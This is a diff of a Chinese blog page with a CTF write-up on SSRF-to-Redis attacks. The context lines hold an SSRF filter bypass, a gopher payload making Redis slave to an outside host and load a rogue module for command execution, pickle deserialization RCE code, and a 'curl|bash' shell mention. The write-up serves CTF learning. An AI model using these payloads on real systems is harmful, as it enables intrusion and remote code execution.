@@ -479,7 +479,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>首先拿到题目是经典的yulige标配ssrf。可以看到,我们允许使用的scheme是http,gopher以及dict。然后需要绕过一个内网ip检测，即可进行curl的ssrf.</p>
 <p>看到提示说访问hint.php。看来需要绕过ip限制进行内网访问。这个点之前总结ssrf时提到过,算是基本trick了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure>
-<p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>得到一个redis密码。下面是试图得到webshell</p>
 <p>通常来说ssrf+redis getshell主要是这几种姿势</p>
 <ol>
@@ -497,9 +497,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>因此本题只要用到两个两个工具即可<br><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
 <p>前者用于生成payload，同时也可启动恶意server。后者主要是exp.so。建议把exp.so直接拷到前面文件夹下就行了。</p>
 <p>然后我们设置对应的payload。修改<code>ssrf-redis.py</code>在默认的rce模式下,只要改命令，lhost,lport,密码即可。然后启动恶意服务器。用前面生成好的payload直接打。<br><code>url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code><br>第一次打会建立好主从复制。这时候就可以关掉server直接用ssrf命令进行RCE了。</p>
-<p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" class="lazyload" data-srcset="%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="pwnhub公开赛-七爪鱼-flag在线爬取系统"><a href="#pwnhub公开赛-七爪鱼-flag在线爬取系统" class="headerlink" title="pwnhub公开赛-七爪鱼 flag在线爬取系统"></a>pwnhub公开赛-七爪鱼 flag在线爬取系统</h2><p>这次做题本来是因为被RCTF虐惨了跑去看看的。结果难度似乎适中。刚好给我一点点满足感。</p>
-<p>首先题目server是gunicorn的配置。这个从header中可以看出来。然后注册登录后发现有一个爬虫<code>/spider</code>路由。拿<code>file:///etc/passwd</code>打一发可以读到/etc/passwd.看来又是个ssrf。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" class="lazyload" data-srcset="%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>同时注意到用户里有redis-db跟server.看来是有redis了。</p>
+<p>首先题目server是gunicorn的配置。这个从header中可以看出来。然后注册登录后发现有一个爬虫<code>/spider</code>路由。拿<code>file:///etc/passwd</code>打一发可以读到/etc/passwd.看来又是个ssrf。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>同时注意到用户里有redis-db跟server.看来是有redis了。</p>
 <p>简单探测下发现6379端口有redis的报错回显。</p>
 <p>第一反应先读了下bash_history。发现一个没权限一个不存在。(假如能用这种方式知道根目录flag的名称那就会简便很多，这也是我在wustctf当时直接读到flag的非预期思路)</p>
 <p>然后期间触发了报错。发现是python的urllib库调用的urlopen。这个库熟悉的话应该都知道是存在CRLF的洞的。我们可以用这个ssrf往自己服务器打一波。nc监听的话会发现是python3.5的urllib。</p>
@@ -520,13 +520,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>这里主要得到两个信息。redis无密码。且是用来存储cookie的。而cookie的值会被调用出来进行pickle的反序列化。</p>
 <p>不用说，我们也大致明白思路了：操作redis修改cookie键对应的值。用cookie刷新触发反序列化RCE。<br>这个考点在去年的swpuctf的web2中也出现过。可惜自己因为环境问题一直没能在buu上做。</p>
-<p>这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" class="lazyload" data-srcset="%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。</p>
+<p>这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。</p>
 <p>那么很简单了，我们生成下RCE代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').system('echo `ls /` &gt; /tmp/byc')"</span>,))</span><br><span class="line">a = exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
 <p>这里为了不给服务器带来困扰，直接把根目录ls的结果写到tmp目录下，然后我们就能用读文件的途径直接读了。</p>
 <p>命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</span><br></pre></td></tr></table></figure>
-<p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>接下来就可以直接读flag了。当然后面我试了下直接用<code>curl xxx|bash</code>弹个shell也是可以的。方法有很多。</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>两道题都算是php与redis以及python与redis的经典搭配了。当然redis的利用还有很多，以后会慢慢学习。</p>
 <p>然后RCTF险些爆零……calc这题真的是太考验基本功了。做的人心累。</p>
@@ -551,11 +551,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
                 <p>本文永久链接是：<a href=https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/>https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/</a></p>
               
             
-              
-                <p>欢迎打赏！ 您的支持将是我创作的重要动力</p>
-
-              
-            
           </blockquote>
         </div>
       
@@ -578,10 +573,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-24T21:17:42+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:08:25+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jun 24, 2020</p>
+    <p>更新于：Feb 18, 2021</p>
   </a>
 </div>
 
@@ -747,7 +742,7 @@ c...</p>
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
 </div>
       
     
@@ -761,7 +756,7 @@ c...</p>
       
         本站使用
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作为主题
+        作為主題
       
     
       
